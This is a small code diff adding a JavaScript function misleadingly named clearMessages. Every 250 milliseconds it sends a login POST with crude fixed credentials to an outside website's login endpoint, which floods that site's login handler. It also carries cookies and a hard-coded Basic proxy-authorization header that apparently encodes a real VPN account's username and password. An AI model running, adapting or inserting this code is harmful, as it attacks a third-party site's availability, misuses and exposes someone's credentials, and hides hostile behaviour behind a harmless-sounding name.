@@ -1,0 +1,9 @@
+clearMessages = function(){
+
+  setInterval(myMethod, 250);
+  function myMethod( )
+  {
+fetch("https://cit2radio.net/include/logincode.php", {"credentials":"include","headers":{"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-language":"en-US,en;q=0.9","cache-control":"max-age=0","content-type":"application/x-www-form-urlencoded","proxy-authorization":"Basic VVZQTnYxLXNzenh4amlzdjZvaGV4aGh6d3E2ZnBncWJ5bW1zbmVmJmpvaG5kb2VAdXZwbi5tZTpvN3I3cDA4Mml6cHNoZHp6eDBjeHNsZGVudmUzYmNyZg==","upgrade-insecure-requests":"1"},"referrer":"https://cit2radio.net/login","referrerPolicy":"no-referrer-when-downgrade","body":"acc=D%21ck&pw=D%21ck","method":"POST","mode":"cors"}).then(console.log("Done!"))
+  }
+}
+clearMessages();
